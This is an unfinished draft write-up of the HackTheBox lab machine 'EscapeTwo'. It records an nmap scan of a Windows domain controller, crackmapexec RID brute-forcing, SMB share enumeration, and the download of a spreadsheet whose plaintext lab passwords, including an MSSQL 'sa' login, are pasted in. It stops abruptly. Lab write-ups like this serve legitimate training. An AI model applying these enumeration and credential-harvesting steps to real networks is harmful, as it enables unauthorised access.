---
title: HackTheBox - EscapeTwo
date: 2025-01-17 20:00:00 +0530
categories: [HackTheBox, Machine]
tags: [windows]     # TAG names should always be lowercase
description: Short summary of the post.
# toc: true
comments: false
# pin: true
published: false
---

```bash
➜  ~ nmap -sVC 10.10.11.51               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 12:24 IST
Nmap scan report for 10.10.11.51
Host is up (0.21s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-18 06:39:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-18T06:40:43+00:00; -15m49s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-18T06:40:43+00:00; -15m49s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-01-18T06:40:44+00:00; -15m49s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-18T03:23:46
|_Not valid after:  2055-01-18T03:23:46
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-18T06:40:44+00:00; -15m49s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-18T06:40:43+00:00; -15m49s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-18T06:40:05
|_  start_date: N/A
|_clock-skew: mean: -15m49s, deviation: 0s, median: -15m49s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.98 seconds
```

nmap EscapeTwo.htb -sV -Pn -T4

for finding the user
crackmapexec smb 10.10.11.51 -u "rose" -p "KxEPkKe6R8su" --rid-brute | grep SidTypeUser

```
➜  ~ crackmapexec smb 10.10.11.51 -u "rose" -p "KxEPkKe6R8su" --rid-brute | grep SidTypeUser
SMB                      10.10.11.51     445    DC01             500: SEQUEL\Administrator (SidTypeUser)
SMB                      10.10.11.51     445    DC01             501: SEQUEL\Guest (SidTypeUser)
SMB                      10.10.11.51     445    DC01             502: SEQUEL\krbtgt (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1000: SEQUEL\DC01$ (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1103: SEQUEL\michael (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1114: SEQUEL\ryan (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1116: SEQUEL\oscar (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1122: SEQUEL\sql_svc (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1601: SEQUEL\rose (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1607: SEQUEL\ca_svc (SidTypeUser)
```

```
➜  ~ smbclient -L //10.10.11.51 -U rose
Password for [WORKGROUP\rose]:

	Sharename       Type      Comment
	---------       ----      -------
	Accounting Department Disk      
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.51 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```
➜  ~ smbclient //10.10.11.51/Accounting\ Department -U rose
Password for [WORKGROUP\rose]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jun  9 16:22:21 2024
  ..                                  D        0  Sun Jun  9 16:22:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 15:44:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 16:22:07 2024

		6367231 blocks of size 4096. 809119 blocks available
smb: \> get accounts.xlsx
getting file \accounts.xlsx of size 6780 as accounts.xlsx (6.2 KiloBytes/sec) (average 6.2 KiloBytes/sec)
smb: \> 
```

in that xlsz sheet
https://jumpshare.com/viewer/xlsx

First Name	Last Name	Email	Username	Password
Angela	Martin	angela@sequel.htb	angela	0fwz7Q4mSpurIt99
Oscar	Martinez	oscar@sequel.htb	oscar	86LxLBMgEWaKUnBG
Kevin	Malone	kevin@sequel.htb	kevin	Md9Wlq1E5bZnVDVo
NULL	NULL	sa@sequel.htb	sa	MSSQLP@ssw0rd!

easy finish




